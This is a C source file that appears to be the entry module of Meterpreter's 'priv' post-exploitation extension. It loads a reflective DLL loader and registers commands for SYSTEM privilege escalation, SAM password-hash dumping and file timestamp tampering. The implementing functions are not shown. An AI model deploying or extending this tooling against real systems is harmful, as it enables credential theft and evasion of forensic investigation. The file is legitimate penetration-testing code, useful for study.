/*!
 * @brief This module implements privilege escalation features.
 */
#include "precomp.h"
#include "common_metapi.h" 

// Required so that use of the API works.
MetApi* met_api = NULL;

#define RDIDLL_NOEXPORT
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

/*!
 * @brief `priv` extension dispatch table.
 */
Command customCommands[] =
{
	COMMAND_REQ(COMMAND_ID_PRIV_ELEVATE_GETSYSTEM, elevate_getsystem),
	COMMAND_REQ(COMMAND_ID_PRIV_PASSWD_GET_SAM_HASHES, request_passwd_get_sam_hashes),
	COMMAND_REQ(COMMAND_ID_PRIV_FS_GET_FILE_MACE, request_fs_get_file_mace),
	COMMAND_REQ(COMMAND_ID_PRIV_FS_SET_FILE_MACE, request_fs_set_file_mace),
	COMMAND_REQ(COMMAND_ID_PRIV_FS_SET_FILE_MACE_FROM_FILE, request_fs_set_file_mace_from_file),
	COMMAND_REQ(COMMAND_ID_PRIV_FS_BLANK_FILE_MACE, request_fs_blank_file_mace),
	COMMAND_REQ(COMMAND_ID_PRIV_FS_BLANK_DIRECTORY_MACE, request_fs_blank_directory_mace),
	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension.
 * @param api Pointer to the Meterpreter API structure.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD InitServerExtension(MetApi* api, Remote* remote)
{
	met_api = api;
	SET_LOGGING_CONTEXT(api)

	met_api->command.register_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD DeinitServerExtension(Remote* remote)
{
	met_api->command.deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Do a stageless initialisation of the extension.
 * @param ID of the extension that the init was intended for.
 * @param buffer Pointer to the buffer that contains the init data.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD StagelessInit(UINT extensionId, const LPBYTE buffer, DWORD bufferSize)
{
	return ERROR_SUCCESS;
}

/*!
 * @brief Callback for when a command has been added to the meterpreter instance.
 * @param commandId The ID of the command that has been added.
 */
VOID CommandAdded(UINT commandId)
{
}
